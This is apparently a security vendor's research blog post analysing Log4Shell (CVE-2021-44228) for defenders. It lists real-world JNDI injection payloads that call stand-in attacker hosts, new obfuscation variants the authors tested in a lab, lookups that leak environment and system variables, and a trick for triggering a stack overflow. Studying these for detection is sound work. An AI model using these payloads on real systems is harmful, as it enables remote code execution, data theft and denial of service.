The evolving Log4Shell story: analysis of ongoing and future exploits
=====================================================================

On 12 Dec 2021, we published a [blog post](https://www.forescout.com/blog/forescout%e2%80%99s-response-to-cve-2021-44228-apache-log4j-2/) on Forescout's website regarding CVE-2021-44228 on Log4j (a.k.a Log4Shell) and how we are helping customers to detect vulnerable devices and detect exploitation.

Today, we are publishing this note directed towards security researchers and technical analysts. We would like to add some new details to this evolving story, including an assessment of real exploit samples seen in the wild, a new obfuscation technique that we have developed and tested in our lab, and pointers to other useful resources, such as lists of affected vendors and ongoing attack campaigns. 

This is a live document and it will be updated to reflect new developments and findings as soon as we have them.
 
Real samples of exploit attempts
================================

We will skip a description of the vulnerability and basic exploits here, since those were described in our previous [blog post](https://www.forescout.com/blog/forescout%e2%80%99s-response-to-cve-2021-44228-apache-log4j-2/). In a very brief summary, attackers can inject remote JNDI lookups into Log4j instances via Internet-accessible services, such as webservers. These remote lookups can then execute malicious code or exfiltrate data. 

Since last week, attackers have been constantly scanning the web testing new ways to inject JNDI lookup payloads (e.g., in different parts of HTTP requests) and new ways to bypass security mechanisms (e.g., by obfuscating parts of the request). 

There are currently [proofs-of-concept](https://github.com/tangxiaofeng7/apache-log4j-poc) and lists of exploits and bypasses on GitHub (e.g., https://github.com/cyberstruggle/L4sh and https://github.com/pimps/JNDI-Exploit-Kit) as well as open honeypots with real-time data, such as SANS ISCs for [User Agents](https://isc.sans.edu/api/webhoneypotreportsbyua/jndi:/?json) and for [URLs](https://isc.sans.edu/api/webhoneypotreportsbyurl/jndi:/?json). 

A (non-exhaustive) list of exploit examples coming from the sources above and some company publications (such as [JFrog](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/) and [Talos](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)) includes the following:
*	HTTP headers
	*	`User-Agent: ${jndi:ldap://<payload_path>}`
	*	`Authorization: Bearer ${jndi:ldap://<payload_path>}`
	*	`Authorization: Token ${jndi:ldap://<payload_path>}`
	*	`Authorization: Oauth ${jndi:ldap://<payload_path>}`
	*	`Authorization: Basic ${jndi:ldap://<payload_path>}`
	*	`Referer: ${jndi:ldap://<payload_path>}`
*	URL path
	*	`/${jndi:ldap://<payload_path>}`
	*	`/?x=${jndi:ldap://<payload_path>}`
*	Obfuscated requests
	*	`${jndi:${lower:l}${lower:d}${lower:a}${lower:p}}://<payload_path>}`
	*	`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<payload_path>}`
	*	`$%7Bjndi:ldap://<payload_path>%7D`
	*	`j${k8s:k5:-ND}i${sd:k5:-:}`
	*	`j${main:\k5:-Nd}i${spring:k5:-:}`
	*	`j${sys:k5:-nD}${lower:i${web:k5:-:}}`
	*	`j${::-nD}i${::-:}`
	*	`j${EnV:K5:-nD}i:`
	*	`${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}attacker_controled_website/payload_to_be_executed}`
	*	`j${loWer:Nd}i${uPper::}`
	*	`${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker_controled_website/payload_to_be_executed}`
	*	`${jndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}`
	*	`${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}`
	*	`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker_controled_website/payload_to_be_executed}`
	*	`${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}attacker_controled_website/payload_to_be_executed}`
	*	`${jndi:${lower:l}${lower:d}ap://attacker_controled_website/payload_to_be_executed}`
	*	`${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker_controled_website/payload_to_be_executed}`
	*	`${${::-j}ndi:`
	*	`${${::-j}nd${::-i}:`
	*	`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`

Notice that most (if not all) of these examples come from analyzing attack attempts seen in the wild, which is very valuable and provides immediate action for defenders. However, the list includes some examples which are not valid exploits (remember that attackers are spraying the Internet with potentially automatically generated exploit tests) and, more importantly, a list of examples does not provide a comprehensive understanding or explanations of how attackers could find new obfuscation techniques, which is critically important to designing defense mechanisms. In the description below, we analyze the Log4j variable parser to understand what exploits are valid and describe examples of new, valid obfuscation techniques that we have tested in our lab. 

Analyzing the Log4j variable parser
===================================

Whenever the Log4j message parser encounters a log message that contains a variable of the form `${prefix:value:-default}`, it will attempt to expand the expression (the characters `${.*}` denote the boundaries of a variable). The `prefix` part of the variable is extracted, and according to the type of prefix, a corresponding [Lookup Plugin](https://logging.apache.org/log4j/2.x/manual/lookups.html) will be called, and `value` will be passed to it. In case the result of the expansion is null, the `default` value will be used. 

A plugin will attempt to expand the variable and will paste the result into the log message. Log4j may be configured with an arbitrary set of these plugins. For example, for the above exploit payloads to work, the [JNDI Lookup](https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup) plugin must be enabled. Understanding how these plugins work is crucial for determining the capabilities of attackers to obfuscate the attack payloads. 

The Log4j message parser handles variables recursively starting from the "innermost" variable. For example, the variables of the form `${hello: ${world:123}}` will be evaluated in the following way: the parser will first expand the variable `${world:123}` and put the result into the upper-level variable, and then proceed with expanding `${hello: ….}`. 

In variables, no whitespaces are allowed, and the variables are located by the presence of the two consecutive characters $ and {. This means that some obfuscation attempts observed in the wild such as `$%7Bjndi:ldap://<payload_path>%7D` are likely unsuccessful, unless the vulnerable application decodes characters such as `%7B` into `{` before passing the decoded message into Log4j. We discuss a couple of different obfuscation techniques that we came up with in the next section. Also, obfuscation attempts that use the `${upper:.*}` variable expansion (as opposed to `${lower:.*}`) may not work well with the JNDI plugin since upper case letters in the URI are not considered valid.

A researcher brandonshi123 has a pretty good [overview](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/) of the moving parts of the vulnerable implementation, however, we believe that the method `substitute()` (member of the `StrSubstitutor` class), deserves a special mention. The method expands individual variables recursively and it exhibits the ["shotgun parser"](http://langsec.org/papers/langsec-cwes-secdev2016.pdf) antipattern that we have seen a lot during our [Project Memoria](https://www.forescout.com/research-labs/project-memoria/) research. Specifically, attackers can use various Lookup Plugins to bypass payload detection, exfiltrate data, and cause Denial-of-Service attacks. 

For example, attackers can send an entry `{$event:Message}` that will become a log entry which looks something like `Received message {$event:Message}`. When this variable gets expanded, its value will again become `Received message {$event:Message}` (see the EventLookup plugin). Then the parser will encounter the variable `{$event:Message}` again and expand it again into the original message – this would eventually lead to infinite loops. The method contains a check for infinite loops called `checkCyclicSubstitution()` which will throw an exception for scenarios like this:
 ```Java
	/**
     * Checks if the specified variable is already in the stack (list) of variables.
     *
     * @param varName  the variable name to check
     * @param priorVariables  the list of prior variables
     */
    private void checkCyclicSubstitution(final String varName, final List<String> priorVariables) {
        if (!priorVariables.contains(varName)) {
            return;
        }
        final StrBuilder buf = new StrBuilder(BUF_SIZE);
        buf.append("Infinite loop in property interpolation of ");
        buf.append(priorVariables.remove(0));
        buf.append(": ");
        buf.appendWithSeparators(priorVariables, "->");
        throw new IllegalStateException(buf.toString());
    }
```
 
However, this check may be easily be circumvented by sending `${whetever:${event:Message}`. In this case, the check will not detect an infinite loop, and we get a stack overflow exception. In our particular test application this exception has been properly handled, however, it might no be so in other applications.

Attackers can also access sensitive data using other plugins such as `${env` (see [EnvironmentLookup](https://logging.apache.org/log4j/2.x/manual/lookups.html#EnvironmentLookup)). For example, passing the following variables allows the attacker to see the contents of the PATH environment variable on the machine that runs a vulnerable application:
`${jndi:ldap://server:port/Basic/Command/${env:PATH}}`. Similarly to that, [system variables](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html) and [Java variables](https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookupw) such as OS type and version, architecture, username and sensitive paths can be leaked by injecting `${jndi:ldap://server:port/Basic/Command/${sys:user.name}}`, `${jndi:ldap://server:port/Basic/Command/${sys:os.version}}`, `${jndi:ldap://server:port/Basic/Command/${java:os}}` and similar commands.
 
An example of the `${env` variable usage in the wild was provided by [Sean Gallagher of Sophos](https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/).

We believe that, apart from JNDI, there are multiple sensitive plugins that can be used by attackers, including, but not limited to `${main` , `${ctx`, `${env`, `${mdc`, `${spring`, `${sys`, `${web`, `${k8s`, `${java`, `${docker`, `${map`. To limit the potential exposure, such plugins must be disabled if not used (see [Log4j Configuration](https://logging.apache.org/log4j/2.x/manual/configuration.html)). The effects might range from information disclosure to a DoS.


New exploit obfuscation by Forescout Research Labs
==================================================

All the exploit obfuscation examples are based on [lookup substitutions](https://logging.apache.org/log4j/2.x/manual/lookups.html). While analyzing the samples coming from honeypots, a description of [how lookups can be exploited in general](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/), and the JNDI parser (as discussed above), we came up with a new obfuscation method that works but we have not seen reported anywhere yet: 

`${${FORESCOUT:RANDOMVAL:-j}ndi:ldap://<ip_address>/}`

It relies on: (i) the default value operator "-", (ii) a non-resolvable key ("FORESCOUT" which can be replaced by anything that is not resolved), (iii) a non-resolvable value ("RANDOMVAL") and (iv) a default value ("j") that the parser will fall back to. 

We also observed that Unicode characters can be used to successfully exploit the vulnerability. The following format, for instance, is valid for payloads:

`${${( ❛ ͜ʖ ❛ ):RandomValue:-j}ndi:ldap://<ip_address>/}`

Another obfuscation capability we have found is when parts of the URI can be hidden behind environment/system variables that will be dynamically expanded, for example:

`${jndi${sys:path.separator}ldap${sys:path.separator}${sys:file.separator}${sys:file.separator}<ip_address>}`

All of these have been tested against a demo vulnerable setup that we have on our lab (based on https://github.com/christophetd/log4shell-vulnerable-app) and are using to monitor the evolution of attacker methods.

All our findings are also used to improve Forescout products and artifacts. eyeSight customers can install the Security Policy Templates (SPT) plugin version 21.0.11, which is scheduled to be released by December 17, 2021 while eyeInspect customers can update their Threat Detection Add-Ons script to version 1.6 (and above) containing a detection strategy for CVE-2021-44228 exploitation attempts on HTTP.

Other resources
===============

*	There are several organizations and people collecting and continuously updating lists of affected vendors and software, including [CISA](https://github.com/cisagov/log4j-affected-db), [CERT/CC](https://www.kb.cert.org/vuls/id/930724), [NCSC-NL](https://github.com/NCSC-NL/log4shell/blob/main/software/README.md), [Authomize](https://github.com/authomize/log4j-log4shell-affected) and [SwitHak](https://gist.github.com/SwitHak/7e1bfa1e36a5f1f02d900062d188a8a4).
*	There are several descriptions of known ongoing attack campaigns (with IoCs that can be used for detection), including [Khonsari ransomware](https://otx.alienvault.com/pulse/61b89fa75b38538e2395d0ec), [Kinsing cryptominer](https://threatfox.abuse.ch/browse/tag/log4j/) and [ten more malicious samples: Muhstik, Mirai, Elknot/BillGates, m8220, SitesLoader, xmrig.pe, xmrig.ELF, 3 unnamed](https://blog.netlab.360.com/ten-families-of-malicious-samples-are-spreading-using-the-log4j2-vulnerability-now/)
*	[CISA Vulnerability Guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
*	[Network Detection (including Snort rules) from NCC Group](https://research.nccgroup.com/2021/12/12/log4shell-reconnaissance-and-post-exploitation-network-detection/) 
